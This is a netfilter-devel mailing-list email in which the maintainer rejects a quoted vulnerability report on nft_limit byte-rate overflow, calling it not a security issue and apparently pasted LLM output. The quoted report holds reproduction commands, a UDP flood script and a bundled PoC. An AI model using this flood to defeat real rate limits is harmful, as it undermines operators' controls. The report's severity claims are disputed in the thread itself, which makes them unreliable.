Received: from mail.netfilter.org (mail.netfilter.org [217.70.190.124])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A6C6927A92D
	for <netfilter-devel@vger.kernel.org>; Sun, 11 Oct 2026 07:34:24 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=217.70.190.124
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791704069; cv=none; b=gGUlsot7S1Aoe348/qDHytMBn3LdS+IBNtk5ZOB5cWUG7/mvKzjbcppBYT2b5K/kH5+pVV7moJefh7a7RCqlFvpeF1H3L45wszIekcGEIuUsKO59gn6ZATPSu8iNQaB1z9AIX99DqYgmhsIXpdLpnvSxbsJkvPDdMXKVoNKH3yE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791704069; c=relaxed/simple;
	bh=M2jqB3go/psn5NJmrvrF0ZZ3gLkLSmnLFl3DjHfruHU=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=aBXN9iwrfV7lnMBYqdj+5tRqBWHw00iwfYSe4GFzQV73P4WArUAYJeOdWsUXqrxPLK2cujo10W8AT4MbvkEumuQmN74XPmitewcmUdWty9nf37y8XG1lnPppf1cLSrx8Ldi7v0TeOlyOghlRDSTbSflJGlel/m/QuHDcF58EMnU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org; spf=pass smtp.mailfrom=netfilter.org; dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.b=n1W3qMvA; arc=none smtp.client-ip=217.70.190.124
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=netfilter.org
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.b="n1W3qMvA"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=netfilter.org;
	s=2025; t=1791704054;
	bh=J5iXlAfUNN9J+gUZIjTl7iCdvzNdHWCtYglyIwWdww0=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
	b=n1W3qMvA9Ut6Wp3hOLOW4MzT40YYbAgu77R+7MxA+pMhaTYuAqf9aISUBfnKL/2Yb
	 IfD4FfbVHJyiibDkPNEUzjPfjbBHEUW9Upmm7K97LTPb2lhHmiijaSINyPN41HR2sa
	 lkROaGioj7SqLcES5uIZ8oEWyy5v59X2K5Py7lvOs0O6034q4feKp/RWtoBuzLpZmH
	 asB8KsU/81d3RCqTf8Wshzt4+z5FZbjFiXE43sXI3MegFbAuikR8ZYkFHQvz4tvORq
	 /tCdmYcvcf8XT68WyNK+3n+R9aCCq/fcF6YfGZ9Tl08csv98M4LSM8pmBLyOb0nTAf
	 OuvltVFyRJnKg==
Received: from netfilter.org (mail-agni [217.70.190.124])
	by mail.netfilter.org (Postfix) with UTF8SMTPSA id 5B5B06005A;
	Sun, 11 Oct 2026 09:34:14 +0200 (CEST)
Date: Sun, 11 Oct 2026 09:34:11 +0200
From: Pablo Neira Ayuso <pablo@netfilter.org>
To: SaifAllah benMassaoud <saifmassaoudi18@gmail.com>
Cc: netfilter-devel@vger.kernel.org, security@kernel.org
Subject: Re: [SECURITY] netfilter: nft_limit byte-rate bypass via unchecked
 u64 multiplication
Message-ID: <ass78_hPLuoRO2kW@chamomile>
References: <CADikNYAX9Y0kTzdAZ4zNHrxcheN-tQ-DfQJxzmVmwgR9c5FKNw@mail.gmail.com>
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <CADikNYAX9Y0kTzdAZ4zNHrxcheN-tQ-DfQJxzmVmwgR9c5FKNw@mail.gmail.com>

Hi,

This is not a security issue **at all**.

So:

        limit rate 30000 bytes/week

is not working for you?

Maybe you want to use nft_quota instead with a timeout? Maybe, in
nf-next, we can reject such ratelimits.

P.S: Did you _really_ digest this LLM report below before copy-and-pasting
before dumping this mess to the ML? I don't think so.

Thanks!

On Fri, Oct 09, 2026 at 06:01:50PM +0100, SaifAllah benMassaoud wrote:
> Component: net/netfilter/nft_limit.c
> Tested on: Linux 7.0.0-34-generic (x86_64), nftables v1.1.6
> Status in upstream: unfixed as of Linux 7.3-rc5 (72d3fcf80, 2026-09-27)
> ---
> 
> Summary
> 
> This is a kernel defect, in net/netfilter/nft_limit.c. The nft/nftables
> userspace tool only builds the rule and sends it to the kernel over
> NFTA_LIMIT_CMD; the faulty arithmetic runs inside nft_limit.ko on the packet
> path. Patching the userspace package would not fix it — only a kernel change
> does.
> 
> The nftables byte-based rate limiter computes the token-bucket cost of a
> packet
> as:
> 
> c
> u64 cost = div64_u64(priv->nsecs * pkt->skb->len, priv->rate);
> 
> 
> pkt->skb->len is multiplied into priv->nsecs with no overflow check. For
> any byte-based limit whose time unit is long enough that nsecs * skb->len
> crosses 2^64, the product wraps and cost collapses to a small value. The
> token
> bucket is then charged a fraction of the packet's true price, and the
> limiter
> admits traffic far above the configured rate.
> 
> Demonstrated end-to-end: a configured limit rate 30000 bytes/week rule,
> enforced with policy drop, admits 610 MB in 20 seconds — a 70,752x
> under-charge of the token bucket. The identical rule applied to ordinary
> sub-threshold packets blocks 99.9% of the same flood.
> 
> ---
> 
> 1. Root cause
> 
> net/netfilter/nft_limit.c, two reachable eval sites with identical code.
> 
> Anonymous limit expression — nft_limit.c:249-258:
> c
> static void nft_limit_bytes_eval(const struct nft_expr *expr,
> struct nft_regs *regs,
> const struct nft_pktinfo *pkt)
> {
> struct nft_limit_priv *priv = nft_expr_priv(expr);
> u64 cost = div64_u64(priv->nsecs * pkt->skb->len, priv->rate);   /* :254 */
> 
> if (nft_limit_eval(priv, cost))
> regs->verdict.code = NFT_BREAK;
> }
> 
> 
> Named limit object — nft_limit.c:382-391:
> c
> static void nft_limit_obj_bytes_eval(struct nft_object *obj,
>     struct nft_regs *regs,
>     const struct nft_pktinfo *pkt)
> {
> struct nft_limit_priv *priv = nft_obj_data(obj);
> u64 cost = div64_u64(priv->nsecs * pkt->skb->len, priv->rate);   /* :387 */
> ...
> }
> 
> 
> 1.1 Why a wrapped cost causes admission
> 
> nft_limit_eval() — nft_limit.c:32-53:
> 
> c
> u64 now, tokens;
> s64 delta;
> ...
> tokens = priv->limit->tokens + now - priv->limit->last;
> if (tokens > priv->tokens_max)
> tokens = priv->tokens_max;
> priv->limit->last = now;
> delta = tokens - cost;          /* :44  -- evaluated in u64 */
> if (delta >= 0) {               /* :45 */
> priv->limit->tokens = delta;
> ...
> return priv->invert;
> }
> 
> 
> tokens - cost is computed in u64. A wrapped-small cost leaves delta
> non-negative, so the packet is admitted and the bucket is decremented by the
> wrapped amount rather than the real one.
> 
> 1.2 Live disassembly confirmation
> 
> From the shipped module on the running kernel
> (/usr/lib/modules/7.0.0-34-generic/kernel/net/netfilter/nft_limit.ko.zst):
> 
> 
> bc0:  48 0f af 47 20    imul 0x20(%rdi),%rax     nsecs * skb->len
> bc5:  48 f7 77 18       divq 0x18(%rdi)          / rate
> 
> 
> A single imul with no mul/jo overflow-detection pair, whose result
> flows directly into the delta comparison. This confirms the shipped binary,
> not just the source tree.
> 
> 1.3 From arithmetic overflow to security failure
> 
> An integer overflow is not a vulnerability by itself — plenty of arithmetic
> overflows harmlessly. This one becomes a vulnerability at the point where
> the
> corrupted number drives an access decision. In nft_limit there is exactly
> one
> such decision: *"does this packet fit in the token bucket?"* The full chain
> is:
> 
> 1. Defect — nsecs * pkt->skb->len is multiplied with no overflow check
>    (:254, :387).
> 2. Wraparound — the product exceeds 2^64 and wraps to a small value.
> 3. Understated cost — the packet is charged 8.69 s instead of
>    614,900 s, a 70,752x under-charge.
> 4. Bucket never drains — delta = tokens - cost stays non-negative forever,
>    so the bucket is never emptied.
> 5. NFT_BREAK never fires — the limiter never signals "over limit".
> 6. Admission — traffic is passed that the configured rate should have
>    dropped.
> 
> Step 3 is where an arithmetic bug turns into a security failure. Steps 4-6
> are
> ordinary logic operating on a number that is already wrong.
> 
> In defect-reporting terms: the bug is the missing overflow check; the
> mechanism is unsigned 64-bit wraparound; the vulnerability is that the
> byte rate limiter can be made to admit traffic far above its configured
> limit;
> the impact is a silently defeated DoS control. The overflow is the *how*;
> the
> bypass is the *what*.
> 
> Because nsecs and skb->len are unsigned, the wraparound is defined C
> behaviour rather than undefined behaviour — the compiler emits no
> diagnostic and
> the kernel takes no trap. That is precisely why this manifests as a quiet
> wrong
> answer rather than a crash.
> 
> ---
> 
> 2. Arithmetic
> 
> 2.1 Overflow threshold — depends only on the time unit
> 
> The threshold is set by where nsecs * skb_len crosses 2^64. Since
> nsecs = unit * 1e9 is a function of the unit alone, and rate is only a
> *divisor applied after* the overflowing multiply, the threshold does not
> depend
> on the configured rate:
> 
> 
> threshold = floor(2^64 / nsecs) + 1
> 
> 
> Two units matter, because only the longest one crosses 2^64 within reach of
> a
> real packet:
> 
> * day — nsecs = 8.64e13, so the threshold is skb_len ≥ 213,504. That
>   exceeds the largest skb_len a packet can have, so a daily byte limit is
> not
>   reachable.
> * week (the longest unit nft accepts) — nsecs = 6.048e14, giving a
>   threshold of skb_len ≥ 30,501. This one is reachable.
> 
> 2.2 Amplification vs. actual throughput — two distinct claims
> 
> These must not be conflated, and the report does not conflate them.
> 
> Amplification ratio — rate divides out, so it is rate-independent:
> 
> 
> amplification = nsecs*skb_len / ((nsecs*skb_len) mod 2^64)   =  70,752x
> 
> 
> Absolute throughput — *not* rate-independent. Per-packet cost is
> true_cost/rate vs. wrapped_cost/rate, so the achievable admit rate scales
> directly with the configured rate. At skb_len=30501:
> 
> Three rates illustrate this at skb_len=30501. At 1,000 bytes/week the true
> per-packet cost is 18,447,004.8 s but only 260.726 s is charged. At 30,000
> bytes/week — the rate actually demonstrated — the true cost is 614,900.16 s
> while just 8.691 s is charged. At 100,000 bytes/week the true cost is
> 184,470.048 s against 2.607 s charged. The ratio is 70,752x in every case,
> because rate cancels; what changes with rate is the absolute number of
> seconds involved.
> 
> Correctly stated: the *threshold* and the *amplification factor* are
> rate-independent; the *throughput obtained* is not.
> 
> 2.3 The wrap boundary
> 
> At rate=30000 bytes/week:
> 
> At rate=30000 bytes/week, a packet of skb_len = 30,500 does not wrap:
> its true cost is 614,880.000 s and its charged cost is likewise 614,880.000
> s.
> 
> One byte larger, at skb_len = 30,501, the product overflows. The true cost
> is
> 614,900.160 s, but the charged cost collapses to 8.691 s.
> 
> A single-step collapse of 70,752x at exactly
> skb_len = 30501 = floor(2^64/nsecs) + 1.
> 
> ---
> 
> 3. Reproduction
> 
> 3.1 Exact conditions required
> 
> All of the following must hold simultaneously:
> 
> 1. A byte-based limit (bytes/<unit>). Packet-count limits
>    (nft_limit_pkts_eval) are unaffected — they use priv->cost, a fixed
>    per-packet value.
> 2. A time unit long enough that nsecs * skb_len can cross 2^64. With
>    nft(8) the only qualifying unit is week (threshold skb_len ≥ 30501);
>    day requires skb_len ≥ 213,504, which exceeds the maximum skb_len.
> 3. Packets whose skb->len reaches that threshold — here skb_len = 30501
>    (30473 B UDP payload + 20 B IPv4 + 8 B UDP), achievable on a standard
>    loopback MTU 65536 path.
> 4. nftables reachable by the attacker, i.e. CAP_NET_ADMIN in a non-initial
>    user namespace — available to any unprivileged local user.
> 
> > Environment note. On Ubuntu 24.04+ the unshare -Urn route additionally
> > depends on kernel.apparmor_restrict_unprivileged_userns=0. That is a
> > userspace confinement policy, not a kernel restriction — it does not bear
> > on the defect, and the usual CI, container, and VM environments reach this
> > path without it. On such a host, either set that sysctl or run the PoC
> under a
> > profile that permits user namespaces.
> 
> 3.2 Setup (unprivileged)
> 
> bash
> unshare -Urn -- bash
> ip link set lo up
> ip addr add 127.0.0.1/8 dev lo
> 
> nft add table ip t
> nft add chain ip t c '{ type filter hook input priority 0; policy drop; }'
> nft add rule ip t c limit rate 30000 bytes/week accept
> 
> 
> > Rule-form note (implementation detail that matters for reproduction).
> > nft_limit_*_eval() sets regs->verdict.code = NFT_BREAK, which per
> > include/uapi/linux/netfilter/nf_tables.h:57 only "terminate[s] evaluation
> of
> > the current rule" — it does not drop the packet. Over-limit packets
> > therefore fall through to the next rule / chain policy. The enforcing
> rule must
> > carry its own verdict (limit ... accept) with policy drop. Writing
> > limit ... followed by a separate accept rule lets every packet through.
> 
> 3.3 Traffic generator
> 
> This is the complete manual reproduction — run it inside the shell from
> §3.2 and
> it prints how many packets the limiter admitted. Nothing else is required.
> 
> python
> import socket, time, threading
> 
> SKB_LEN, N = 30501, 20000
> 
> r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   receiver = "server"
> r.bind(("127.0.0.1", 0))
> port = r.getsockname()[1]
> r.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 64 << 20)
> 
> admitted, stop = [0], [False]
> def drain():
>     r.settimeout(0.15)
>     while not stop[0]:
>         try:
>             r.recvfrom(70000); admitted[0] += 1   counted == made it past
> the limit
>         except socket.timeout:
>             pass
>         except OSError:
>             return
> threading.Thread(target=drain, daemon=True).start()
> 
> s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   sender = "attacker"
> for _ in range(N):
>     s.sendto(b"A" * (SKB_LEN - 28), ("127.0.0.1", port))   30473 + 20 IP +
> 8 UDP
> 
> time.sleep(1.0); stop[0] = True; time.sleep(0.3)
> print(f"admitted {admitted[0]}/{N}  = {admitted[0]*SKB_LEN/1e6:.1f} MB "
>       f"through a 30000 B/week limit")
> 
> 
> Expected: admitted 20000/20000 = 610.0 MB.
> 
> Then re-run §3.2 to reinstall the rule, change SKB_LEN to 1528, and re-run
> this script. Expected: admitted 19/20000 = 0.0 MB. That contrast — same
> rule,
> same flood volume, only packet size differs — is the entire demonstration.
> 
> The scripted PoCs in §7 do this automatically and assert the rule is
> actually
> present, which the manual path does not check.
> 
> 3.4 Observed results
> 
> Identical rule, identical flood volume, only skb_len differs.
> 
> The control arm sent skb_len = 1,528: 19 of 20,000 packets were
> admitted and 19,981 were blocked — 99.9% blocked, 29 KB through the policy.
> 
> The attack arm sent skb_len = 30,501: 20,000 of 20,000 packets were
> admitted and 0 were blocked — 610 MB through the same 30,000 B/week
> policy.
> 
> The contrast is the finding: the control arm proves the rule is installed
> and
> enforcing; the attack arm proves enforcement collapses purely as a function
> of
> packet size. Both figures reproduce deterministically.
> 
> 3.5 Packet-size sweep — boundary is the 2^64 crossing
> 
> Twelve packet sizes were tested, each in a fresh ruleset under the same
> 30000 bytes/week rule, bursting 3,000 packets apiece.
> 
> Below the threshold — no overflow, limiter holds. At skb_len 1,400 the
> charged cost is 28,224 s and 21 packets were admitted. At 1,528 it is
> 30,804 s
> and 19 were admitted. At 30,000 it is 604,800 s and just 1 was admitted. At
> 30,500 the cost is 614,880 s and 0 packets were admitted — the limiter
> blocked the entire burst.
> 
> At the threshold — total collapse. At 30,501 the charged cost drops to
> 8.69 s and all 3,000 packets were admitted. At 30,502 the charged cost
> is 28.85 s, and again all 3,000 were admitted.
> 
> Above the threshold — still bypassing, decaying magnitude. At 31,000 the
> charged cost is 10,068 s and 60 packets were admitted; at 32,768, 45,711 s
> and
> 13 admitted; at 40,000, 191,508 s and 3 admitted; at 50,000, 393,108 s and 1
> admitted; at 60,000, 594,708 s and 1 admitted; at 65,000, 80,617 s and 7
> admitted.
> 
> The discontinuity at 30,500 → 30,501 lands precisely on the predicted 2^64
> crossing, which identifies this overflow — and not some incidental timing
> effect — as the mechanism.
> 
> The magnitude of the bypass decays as packets grow past the threshold,
> because
> the wrapped cost nsecs * skb_len mod 2^64 climbs back up with packet size:
> burst capacity is ~69,590 packets at 30501 but only 7 at 65000. Every
> wrapping size still defeats the limiter — a correct bucket admits 0 packets
> at
> this rate — but the dramatic case is the 30501–30502 band.
> 
> 3.6 Named limit object path
> 
> The second eval site (:387) reproduces identically:
> 
> bash
> printf 'table ip t {\n\tlimit lim {\n\t\trate 30000 bytes/week ;\n\t}\n}\n'
> > lim.nft
> nft -f lim.nft
> nft add chain ip t c '{ type filter hook input priority 0; policy drop; }'
> nft add rule ip t c limit name lim accept
> 
> 
> Result with the same 30,501-byte flood: 3,000 / 3,000 admitted.
> 
> ---
> 
> 4. Scope of impact
> 
> * Security-control bypass. A byte-rate limit — the standard nftables
>   anti-abuse / anti-DoS primitive — silently stops limiting. The rule
> remains
>   valid and continues to appear correctly in nft list ruleset; only
> enforcement
>   is gone. Nothing warns the operator.
> * Unprivileged. No CAP_NET_ADMIN in the initial user namespace. nftables is
>   reachable from an unprivileged user + network namespace, the standard
> container
>   and multi-tenant posture.
> * Both rule forms affected — anonymous limit expression and named limit
>   object.
> * limit ... over (inverted) rules are affected in the mirror sense: the
>   NFT_LIMIT_F_INV path trusts the same wrapped cost.
> * No memory-safety impact, no crash, no oops. This is a pure logic /
>   integer-arithmetic defect. No out-of-bounds access, no use-after-free, no
>   refcount or lifetime issue. No interaction with panic_on_oops.
> * Honest scoping of the threat model. In the demonstrated configuration the
>   same unprivileged user both installs the rule and generates the traffic,
> so
>   the practical blast radius is bounded by ruleset ownership. The
>   security-relevant case is a limit authored by a *more privileged* party —
> a
>   host or container netns handed to a less-privileged tenant, or a limit on
> a
>   shared ingress path. There, the configured limit is the trust boundary,
> and it
>   can be evaded by packet size alone, without any privilege.
> 
> ---
> 
> 5. Affected versions
> 
> Three trees were checked. v7.0 (commit 028ef9c) is vulnerable, with the
> fault at :254 and :387. v7.2.8 is vulnerable at :253 and :385 — the
> line numbers shift, the defect does not. v7.3-rc5 (commit 72d3fcf80,
> 2026-09-27) is also vulnerable, with no fix present.
> 
> git log -- net/netfilter/nft_limit.c shows no commit addressing this, and no
> overflow guard was added to either eval site in any checked tree. No
> matching
> CVE or public advisory was found; the nearest nftables CVEs
> (CVE-2026-63920 put_cmsg, CVE-2026-53267 nft_ct_get_eval,
> CVE-2023-35001 nft_byteorder) are unrelated defects.
> 
> 5.1 Userspace clamps are not a mitigation
> 
> * nft(8) accepts only second|minute|hour|day|week, and caps rate at 30,500.
> * Both are userspace restrictions. NFTA_LIMIT_RATE and NFTA_LIMIT_UNIT
>   are NLA_U64, and the kernel's only constraint on unit is
>   check_mul_overflow(unit, NSEC_PER_SEC) — which does not bound the
>   packet-path product.
> * The demonstrated configuration therefore uses the *maximum* rate any
>   shipping client accepts (30,000) and the *longest* unit available (week),
>   i.e. the most conservative point that still triggers the overflow. The
>   overflow is not an artifact of userspace clamping.
> 
> ---
> 
> 6. Suggested fix
> 
> Guard the packet-path product in both eval sites. nft_limit_eval() is
> static inline returning bool, so the call sites can clamp rather than fail:
> 
> c
> u64 bytes, cost;
> 
> /* A product that overflows must be treated as maximally expensive, not
> * allowed to wrap to a small value that reads as "affordable".
> */
> if (check_mul_overflow(priv->nsecs, pkt->skb->len, &bytes))
> cost = U64_MAX;
> else
> cost = div64_u64(bytes, priv->rate);
> 
> 
> Saturating cost matters more than it looks. An early return here would be a
> fail-open fix, not a fail-closed one: the function returns false ("under
> limit"), so NFT_BREAK is never set, the chain continues, and the accept
> verdict on the rule lets the oversized packet through. Saturating to U64_MAX
> feeds the existing delta = tokens - cost comparison, so the packet exhausts
> the bucket and takes the normal over-limit path — for the limit ... over
> (inverted) form it likewise falls on the correct side, since an
> astronomically-over-limit packet is genuinely over the limit.
> 
> Alternatively, bound nsecs at init such that nsecs * max_skb_len cannot
> overflow, or reject byte limits whose unit permits it.
> 
> pkt->skb->len is bounded by device MTU and by GSO/GRO aggregation, so a fix
> should not assume a small upper bound.
> 
> ---
> 
> 7. Proof of concept
> 
> The whole demonstration is one self-contained script, poc, included as an
> attachment. It embeds the three proof-of-concept programs below, runs each
> in
> turn, and cleans up after itself. Every program creates its own nftables
> ruleset, brings up lo, measures what the limiter admits, and exits — nothing
> needs configuring by hand.
> 
> What each embedded program establishes:
> 
> * the bypass test — the bug itself. Applies the same limit rule at two
>   packet sizes: a sub-threshold packet is correctly limited, an
>   overflow-triggering packet is not. Prints a pass/fail verdict.
> * the boundary sweep — that the trigger point is *exactly* where
>   nsecs * skb_len crosses 2^64 and nowhere else. Sweeps 12 packet sizes.
> * the limit-object test — that the named limit-object code path
>   (nft_limit_obj_eval, :387) is affected identically to the anonymous rule
>   path (:254).
> 
> 7.1 How to run it
> 
> A single self-contained script is attached as poc. It embeds all three
> proof-of-concept programs, unpacks them to a temporary directory, runs them
> in
> order, and cleans up on exit. No arguments, no setup, no companion files.
> 
> bash
> chmod +x poc
> ./poc
> 
> 
> It prints five labelled steps:
> 
> 
> [1] limit rule    the rule under test, as installed
> [3] nft_limit.c   the vulnerable line, at both eval sites
> [4] boundary      skb_len sweep showing the 30,501 threshold
> [5] limit object  the named limit-object path (:387)
> 
> 
> Between steps 1 and 3 the script measures the bypass itself: the limit
> arithmetic, then the same rule applied at two packet sizes with the verdict.
> 
> poc re-execs itself inside unshare -Urn when it is not already in a user
> namespace. That is what makes the demonstration unprivileged: a user
> namespace
> plus a network namespace give the process CAP_NET_ADMIN over its *own
> private*
> ruleset while it remains uid 1000 with CapEff=0 outside. No root is needed
> and the host's real firewall is never touched.
> 
> > On a stock Ubuntu 24.04+ desktop, AppArmor may block unshare -Urn
> > (kernel.apparmor_restrict_unprivileged_userns=1). That is a userspace
> > confinement policy, not a kernel restriction, and is unrelated to the
> defect.
> > Either set that sysctl to 0, run under a profile that permits user
> > namespaces, or use any container/VM/CI environment. Servers are
> unaffected.
> 
> Section 7.4 lists the complete source. poc is the only file needed to
> reproduce: it contains all three proof-of-concept programs inline, so there
> is
> nothing else to download, build, or unpack.
> 
> 7.2 Expected output
> 
> 
> [+] policy        : 30000 bytes / week  (nft CLI max rate)
> [+] nsecs         : 604800000000000
> [+] nsecs*skb_len : 18447004800000000000
> [+] 2^64          : 18446744073709551616
> [+] wraps         : True   cost_num=260726290448384
> [+] amplification : 70,752x
> [+] correct  = 170.81 h/pkt   overflow = 8.691 s/pkt
> 
>   CONTROL  skb_len=1528  (no overflow)
>     rule='limit rate 30000 bytes/week'  skb_len=1528 (payload 1500)
>     sent=20000 in 0.02s -> ADMITTED=19  BLOCKED=19981   [0.03 MB admitted]
>   ATTACK   skb_len=30501  (overflow)
>     rule='limit rate 30000 bytes/week'  skb_len=30501 (payload 30473)
>     sent=20000 in 0.06s -> ADMITTED=20000  BLOCKED=0   [610.02 MB admitted]
> Policy allows 30000 B/week = 0.99 B over a 20s window
> effective burst capacity: control=19 pkts  attack=69590 pkts
> CONTROL admitted       29,032 B  (19/20000 pkts, 99.9% blocked)
> ATTACK  admitted  610,020,000 B  (20000/20000 pkts, 0.0% blocked) = 610.0 MB
> 
> control blocks >90%: True | attack admits ~all: True | verdict: True
> BYPASS CONFIRMED -- a 30000 B/week DoS-control admitted 610.0 MB in 20s
> 
> 
> control=19 pkts is the honest burst capacity of the bucket at skb_len=1528
> (tokens_max / cost), and 19 is exactly how many the control arm admitted.
> attack=69590 pkts is the same formula with the wrapped cost.
> 
> 7.3 Expected output — boundary sweep
> 
> Columns, in order: skb_len — packet size; wraps — whether nsecs * skb_len
> reaches 2^64; cost/pkt(correct) and cost/pkt(overflow) — the per-packet
> charge in seconds before and after the wrap; admitted/3000 — how many of
> 3000
> packets the limiter let through; verdict — whether the control failed.
> 
> 
> [!] nsecs=604800000000000  predicted wrap threshold skb_len>=30501
> 
>       1400  False         28224.000s        28224.0000s        21/3000
>  blocked
>       1528  False         30804.480s        30804.4800s        19/3000
>  blocked
>      30000  False        604800.000s       604800.0000s         1/3000
>  blocked
>      30500  False        614880.000s       614880.0000s         0/3000
>  blocked
>      30501   True        614900.160s            8.6909s      3000/3000
>  BYPASS
>      30502   True        614920.320s           28.8509s      3000/3000
>  BYPASS
>      31000   True        624960.000s        10068.5309s        60/3000
>  blocked
>      32768   True        660602.880s        45711.4109s        13/3000
>  blocked
>      40000   True        806400.000s       191508.5309s         3/3000
>  blocked
>      50000   True       1008000.000s       393108.5309s         1/3000
>  blocked
>      60000   True       1209600.000s       594708.5309s         1/3000
>  blocked
>      65000   True       1310400.000s        80617.0618s         7/3000
>  blocked
> 
> 
> The discontinuity between 30500 and 30501 is the whole finding in one
> table: at 30,500 bytes the limiter blocks every packet; at 30,501 bytes it
> admits every packet.
> 
> The effect is strongest immediately above the threshold and decays as
> packets
> grow, because the wrapped cost nsecs * skb_len mod 2^64 climbs back up with
> packet size. 30501/30502 yield a near-total bypass (~69,590-packet burst
> capacity); by 65000 the burst capacity is down to 7 packets. Every wrapping
> size still defeats the limiter, since a correct bucket admits 0 packets at
> this
> rate, but the dramatic case is the 30501–30502 band.
> 
> 7.4 Source — poc (complete, self-contained)
> 
> bash
> !/bin/bash
> nft_limit byte-rate limit bypass - self-contained demo.
> All PoC code is embedded below; no external files needed.
>   ./poc          normal
>   FAST=1 ./poc   no pauses
> 
> set -u
> 
> if [ "$(id -u)" != "0" ]; then
>     unshare -Urn -- bash "$0" "$@"
>     rc=$?
>     [ "$rc" -ne 0 ] && { echo; echo "blocked: no user namespace."
>         echo "fix:  sudo sysctl -w
> kernel.apparmor_restrict_unprivileged_userns=0"; }
>     exit $rc
> fi
> 
> PAUSE=1; [ "${FAST:-}" = "1" ] && PAUSE=0
> nap() { [ "$PAUSE" = "1" ] && sleep "${1:-2}"; }
> 
> W=$(mktemp -d)
> trap 'rm -rf "$W"' EXIT
> 
> cat > "$W/nft_limit_bypass_final.py" <<'POC_STEP_A_EOF'
> !/usr/bin/env python3
> """
> Live PoC: nftables byte-rate limit (DoS-control) bypass via u64 overflow.
> 
> ROOT CAUSE -- net/netfilter/nft_limit.c:254 and :387 (identical code):
>       u64 cost = div64_u64(priv->nsecs * pkt->skb->len, priv->rate);
> 
>   * priv->nsecs = unit_seconds * 1e9.  Validated only by
>         check_mul_overflow(unit, NSEC_PER_SEC, &priv->nsecs)
> [nft_limit.c:73]
>     so nsecs may approach 2^64.  Largest unit nft accepts is week
>     -> nsecs = 604800 * 1e9 = 6.048e14.
>   * pkt->skb->len is multiplied in with NO overflow check, so
>     nsecs * skb->len wraps mod 2^64.
>   * nft_limit_eval()  [nft_limit.c:44-45]:
>         delta = tokens - cost;      /* u64 arithmetic */
>         if (delta >= 0) { accept }
>     A wrapped-small cost therefore reads as "affordable" and the packet is
>     admitted even though it should have drained the bucket many times over.
> 
> AMPLIFICATION = nsecs*skb_len / ((nsecs*skb_len) mod 2^64)
>   rate cancels out.
> 
> Verified parameters (skb->len INCLUDES 20B IP + 8B UDP headers):
>     unit=week, nsecs = 6.048e14
>     wrap needs skb->len >= 30501
>     skb->len = 30501 -> cost_num = 260,726,290,448,384
>     AMPLIFICATION = 70,752x
> 
>   nft(8) userspace rejects rate > 30500, so the PoC uses the max legal
>   CLI value, rate=30000 bytes/week:
>       correct  cost/pkt = nsecs*skb_len/rate = 614,900 s  (~171 h)
>       overflow cost/pkt = cost_num/rate       =      8.69 s
>   => the overflow under-charges each packet by 70,752x, so a correct
>      limiter (19-packet burst at skb_len=1528) lets 69,590 through.
> 
> Unprivileged: whole PoC runs inside unshare -Urn; outside the userns the
> process is uid 1000 with CapEff=0.  No crash, no oops -- pure logic bug.
> """
> import os, socket, subprocess, sys, threading, time
> 
> NFT = "nft"
> IP_HDR, UDP_HDR = 20, 8
> U64 = 1 << 64
> 
> def sh(c):
>     return subprocess.run(c, shell=True, capture_output=True, text=True)
> 
> def build(rule):
>     """Enforce a byte limit correctly.
> 
>     nft_limit_*_eval() sets regs->verdict.code = NFT_BREAK when the limit is
>     EXCEEDED, and NFT_BREAK only "terminates evaluation of the current rule"
>     (nf_tables.h:57) -- it does NOT drop.  So the enforcing rule must carry
>     its own verdict:
> 
>         limit rate <R> bytes/week accept      under limit -> accept
> 
>     and over-limit packets must fall through to the chain policy (drop).
>     An earlier revision used limit ... + a separate accept rule, which let
>     EVERY packet through because NFT_BREAK fell straight into that accept.
>     """
>     sh("nft flush ruleset")
>     sh("nft add table ip t")
>     sh("nft add chain ip t c '{ type filter hook input priority 0; policy
> drop; }'")
>     r = sh(f"nft add rule ip t c {rule} accept")
>     if r.returncode != 0:
>         sys.exit(f"FATAL: limit rule '{rule} accept' rejected:
> {r.stderr.strip()}")
>     ls = sh("nft list chain ip t c").stdout
>     if "limit rate" not in ls:
>         sys.exit(f"FATAL: limit rule absent from ruleset:\n{ls}")
>     if "policy drop" not in ls:
>         sys.exit(f"FATAL: chain policy is not drop:\n{ls}")
>     return ls
> 
> def run(rule, skb_len, n, window_s, label):
>     build(rule)
>     payload = skb_len - IP_HDR - UDP_HDR
>     if payload <= 0:
>         sys.exit(f"skb_len {skb_len} too small")
> 
>     r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
>     r.bind(("127.0.0.1", 0))
>     r.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 64 << 20)
>     port = r.getsockname()[1]
>     r.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 64 << 20)
> 
>     admitted = [0]
>     stop = [False]
>     def drain():
>         r.settimeout(0.15)
>         while not stop[0]:
>             try:
>                 r.recvfrom(70000); admitted[0] += 1
>             except socket.timeout:
>                 pass
>             except OSError:
>                 return
